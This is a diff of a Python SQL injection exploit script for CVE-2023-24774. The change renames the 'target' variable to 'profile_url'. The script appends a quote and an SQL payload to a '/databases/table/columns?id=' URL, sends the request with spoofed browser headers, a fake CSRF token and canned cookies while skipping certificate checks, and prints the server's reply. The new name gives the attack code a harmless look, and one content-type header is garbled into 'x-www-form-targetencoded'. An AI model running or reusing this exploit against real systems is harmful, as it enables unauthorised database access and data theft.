@@ -11,7 +11,7 @@ def generate_csrf_token():
     csrf_token = uuid.uuid4()
     return str(csrf_token).replace('-', '')
 
-def common_headers(target):
+def common_headers(profile_url):
     csrf_token = generate_csrf_token()
     headers = {
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36",
@@ -19,16 +19,16 @@ def common_headers(target):
         "Accept-Language": "zh-CN,zh",
         "X-Requested-With": "XMLHttpRequest",
         "X-CSRF-TOKEN": csrf_token,
-        "Host": target,
+        "Host": profile_url,
         "Content-Type": "application/x-www-form-targetencoded",
         "charset": "UTF-8",
         "Accept-Encoding": "gzip"
     }
     return headers
 
-def scan_cve_2023_24774(target):
-    headers = common_headers(target)
-    target = f"{target}/databases/table/columns?id='"
+def scan_cve_2023_24774(profile_url):
+    headers = common_headers(profile_url)
+    profile_url = f"{profile_url}/databases/table/columns?id='"
 
     cookies = {
         'Hm_lvt_ce074243117e698438c49cd037b593eb': '1673498041',
@@ -42,10 +42,10 @@ def scan_cve_2023_24774(target):
     else:
         sqli = sqli.replace(' ', '+')
 
-    target += f"{sqli}--+qRTY"
-    print(f"Request target: {target}")
+    profile_url += f"{sqli}--+qRTY"
+    print(f"Request target: {profile_url}")
 
-    sqli_request = requests.get(target, cookies=cookies, headers=headers, verify=False)
+    sqli_request = requests.get(profile_url, cookies=cookies, headers=headers, verify=False)
     print(sqli_request.text)
 
     if 'message' in sqli_request.text:
